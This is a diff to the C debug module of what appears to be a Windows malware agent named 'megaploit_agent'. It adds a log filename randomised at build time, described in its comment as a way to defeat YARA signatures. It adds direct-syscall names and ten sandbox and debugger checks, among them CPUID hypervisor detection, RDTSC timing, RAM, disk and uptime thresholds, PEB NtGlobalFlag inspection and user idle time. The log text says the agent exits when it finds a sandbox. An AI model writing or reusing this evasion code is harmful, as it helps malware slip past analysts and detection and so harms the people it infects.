@@ -26,7 +26,14 @@ static FILE   *g_log      = NULL;
 static BOOL    g_init_done = FALSE;
 static CRITICAL_SECTION g_cs;       /* serialise concurrent thread writes       */
 
-#define LOG_PATH  "C:\\Windows\\Temp\\megaploit_agent_debug.log"
+/* F-12: log filename is randomised at build time via AGENT_DEBUG_LOG_TAG
+ * (a 4-hex-char build-time tag injected by the Makefile from the current
+ * timestamp).  This prevents a static YARA rule from matching the path.  */
+#ifdef AGENT_DEBUG_LOG_TAG
+#  define LOG_PATH  "C:\\Windows\\Temp\\megaploit_agent_" AGENT_DEBUG_LOG_TAG ".log"
+#else
+#  define LOG_PATH  "C:\\Windows\\Temp\\megaploit_agent_debug.log"
+#endif
 #define ODS_PFX   "[MAGENT] "
 
 /* ── Severity label helper ───────────────────────────────────────────────── */
@@ -222,6 +229,9 @@ static const char *_sc_names[] = {
     "NtUnmapViewOfSection",
     "NtOpenFile",
     "NtDelayExecution",
+    "NtOpenProcess",             /* slot 11 — F-06/F-07 */
+    "NtQuerySystemInformation",  /* slot 12 — F-07      */
+    "NtQueryVirtualMemory",      /* slot 13 — G-02      */
 };
 
 void dbg_scall(void)
@@ -332,51 +342,114 @@ void dbg_sandbox(BOOL sandbox_result)
             sandbox_result ? "TRUE  (sandbox detected — agent will exit)"
                            : "FALSE (clean environment)");
 
-    /* Physical RAM */
+    /* Check 1 — Hypervisor bit */
+    DWORD ecx_hv = 0;
+    __asm__ __volatile__("cpuid" : "=c"(ecx_hv) : "a"(1) : "ebx","edx");
+    int hv = (ecx_hv >> 31) & 1;
+    dbg_log(DBG_SS_SANDBOX, hv ? DBG_WARN : DBG_INFO,
+            "  [1] Hypervisor bit   : %s", hv ? "SET (VM present)" : "clear");
+
+    /* Check 2 — RDTSC delta (threshold 50 000) */
+    DWORD lo1, hi1, lo2, hi2;
+    __asm__ __volatile__(
+        "xorl %%eax,%%eax\n\tcpuid\n\trdtsc"
+        : "=a"(lo1), "=d"(hi1) :: "ebx","ecx");
+    __asm__ __volatile__(
+        "xorl %%eax,%%eax\n\tcpuid\n\trdtsc"
+        : "=a"(lo2), "=d"(hi2) :: "ebx","ecx");
+    DWORD64 t1    = ((DWORD64)hi1 << 32) | lo1;
+    DWORD64 t2    = ((DWORD64)hi2 << 32) | lo2;
+    DWORD64 delta = t2 - t1;
+    dbg_log(DBG_SS_SANDBOX, (delta > 50000) ? DBG_WARN : DBG_INFO,
+            "  [2] RDTSC delta      : %llu cycles (threshold 50000, %s)",
+            delta, (delta > 50000) ? "TRIGGERS" : "OK");
+
+    /* Check 3 — Physical RAM (threshold 2 GB) */
     MEMORYSTATUSEX ms;
     ms.dwLength = sizeof(ms);
     if (GlobalMemoryStatusEx(&ms)) {
-        DWORD gb = (DWORD)(ms.ullTotalPhys / (1024*1024*1024));
-        dbg_log(DBG_SS_SANDBOX, (gb < 4) ? DBG_WARN : DBG_INFO,
-                "  RAM          : %lu GB (%s)",
-                gb, (gb < 4) ? "< 4 GB — sandbox heuristic triggers" : "OK");
+        DWORD64 mb = ms.ullTotalPhys / (1024*1024);
+        dbg_log(DBG_SS_SANDBOX, (ms.ullTotalPhys < (DWORD64)2*1024*1024*1024) ? DBG_WARN : DBG_INFO,
+                "  [3] Physical RAM     : %llu MB (threshold 2048 MB, %s)",
+                mb, (ms.ullTotalPhys < (DWORD64)2*1024*1024*1024) ? "TRIGGERS" : "OK");
     }
 
-    /* CPU count */
+    /* Check 4 — CPU count */
     SYSTEM_INFO si;
-    GetSystemInfo(&si);
+    GetNativeSystemInfo(&si);
     dbg_log(DBG_SS_SANDBOX,
             (si.dwNumberOfProcessors < 2) ? DBG_WARN : DBG_INFO,
-            "  CPUs         : %lu (%s)",
+            "  [4] Logical CPUs     : %lu (%s, %s)",
             si.dwNumberOfProcessors,
-            (si.dwNumberOfProcessors < 2) ? "< 2 — sandbox heuristic triggers" : "OK");
+            (si.dwNumberOfProcessors < 2) ? "single" : "multi",
+            (hv && si.dwNumberOfProcessors < 2) ? "TRIGGERS (hv+single)" : "OK");
 
-    /* Hypervisor bit (CPUID leaf 1 bit 31 of ECX) */
-    int cpuid_buf[4] = {0};
-#if defined(__GNUC__) || defined(__clang__)
-    __asm__ __volatile__(
-        "cpuid"
-        : "=a"(cpuid_buf[0]), "=b"(cpuid_buf[1]),
-          "=c"(cpuid_buf[2]), "=d"(cpuid_buf[3])
-        : "a"(1)
-    );
-#elif defined(_MSC_VER)
-    __cpuid(cpuid_buf, 1);
+    /* Check 5 — sandbox modules (just report count of loaded modules checked) */
+    dbg_log(DBG_SS_SANDBOX, DBG_INFO,
+            "  [5] Module scan      : checked 21 known sandbox DLL names via PEB LDR");
+
+    /* Check 6 — username / hostname */
+    char uname[128] = {0};
+    DWORD ulen = sizeof(uname) - 1;
+    GetUserNameA(uname, &ulen);
+    char cname[128] = {0};
+    DWORD clen = sizeof(cname) - 1;
+    GetComputerNameA(cname, &clen);
+    dbg_log(DBG_SS_SANDBOX, DBG_INFO,
+            "  [6] Identity         : user='%s' host='%s'", uname, cname);
+
+    /* Check 7 — disk size */
+    ULARGE_INTEGER frc, tot, frt;
+    if (GetDiskFreeSpaceExA("C:\\", &frc, &tot, &frt)) {
+        DWORD64 gb = tot.QuadPart / (1024*1024*1024);
+        dbg_log(DBG_SS_SANDBOX, (tot.QuadPart < (DWORD64)60*1024*1024*1024) ? DBG_WARN : DBG_INFO,
+                "  [7] System disk (C:) : %llu GB (threshold 60 GB, %s)",
+                gb, (tot.QuadPart < (DWORD64)60*1024*1024*1024) ? "TRIGGERS" : "OK");
+    }
+
+    /* Check 8 — uptime */
+    DWORD64 uptime_ms = GetTickCount64();
+    DWORD64 uptime_s  = uptime_ms / 1000;
+    dbg_log(DBG_SS_SANDBOX, (uptime_ms < 3ULL*60*1000) ? DBG_WARN : DBG_INFO,
+            "  [8] Uptime           : %llus (threshold 180s, %s)",
+            uptime_s, (uptime_ms < 3ULL*60*1000) ? "TRIGGERS" : "OK");
+
+    /* Check 9 — debugger */
+    {
+        BOOL idb = IsDebuggerPresent();
+
+        /* NtGlobalFlag heap bits — offset varies by bitness */
+        PVOID peb_ptr2;
+#ifdef _WIN64
+        __asm__ __volatile__("movq %%gs:0x60, %0" : "=r"(peb_ptr2));
+        DWORD ntgf = *(DWORD *)((BYTE *)peb_ptr2 + 0xBC);
+#else
+        __asm__ __volatile__("movl %%fs:0x30, %0" : "=r"(peb_ptr2));
+        DWORD ntgf = *(DWORD *)((BYTE *)peb_ptr2 + 0x68);
 #endif
-    int hv = (cpuid_buf[2] >> 31) & 1;
-    dbg_log(DBG_SS_SANDBOX, hv ? DBG_WARN : DBG_INFO,
-            "  Hypervisor   : %s", hv ? "YES (bit31 ECX set)" : "NO");
+        BOOL heap_flags = ((ntgf & 0x70) == 0x70);
 
-    /* RDTSC delta */
-    DWORD lo1, hi1, lo2, hi2;
-    __asm__ __volatile__("cpuid; rdtsc" : "=a"(lo1), "=d"(hi1) :: "rbx","rcx");
-    __asm__ __volatile__("rdtsc"        : "=a"(lo2), "=d"(hi2));
-    DWORD64 t1 = ((DWORD64)hi1 << 32) | lo1;
-    DWORD64 t2 = ((DWORD64)hi2 << 32) | lo2;
-    DWORD64 delta = t2 - t1;
-    dbg_log(DBG_SS_SANDBOX, (delta > 1000000) ? DBG_WARN : DBG_INFO,
-            "  RDTSC delta  : %llu cycles (%s)",
-            delta, (delta > 1000000) ? "> 1M — VM/hook overhead detected" : "OK");
+        dbg_log(DBG_SS_SANDBOX, (idb || heap_flags) ? DBG_WARN : DBG_INFO,
+                "  [9] Debugger         : IsDebuggerPresent=%d NtGlobalFlag=0x%02lX "
+                "heap_bits=%s (%s)",
+                (int)idb, (ULONG)ntgf,
+                heap_flags ? "SET(0x70)" : "clear",
+                (idb || heap_flags) ? "TRIGGERS" : "OK");
+    }
+
+    /* Check 10 — user input idle time */
+    {
+        DWORD64 up_ms   = GetTickCount64();
+        LASTINPUTINFO lii2;
+        lii2.cbSize = sizeof(lii2);
+        BOOL got = GetLastInputInfo(&lii2);
+        DWORD64 idle_ms = got ? (DWORD)(GetTickCount() - lii2.dwTime) : 0;
+        BOOL triggers   = got && (up_ms > 60000ULL) && (idle_ms > 60000ULL);
+        dbg_log(DBG_SS_SANDBOX, triggers ? DBG_WARN : DBG_INFO,
+                " [10] User input       : uptime=%llus idle=%llums (%s)",
+                up_ms / 1000, (DWORD64)idle_ms,
+                triggers ? "TRIGGERS (headless)" : "OK");
+    }
 }
 
 /* ── dbg_tls ─────────────────────────────────────────────────────────────── */
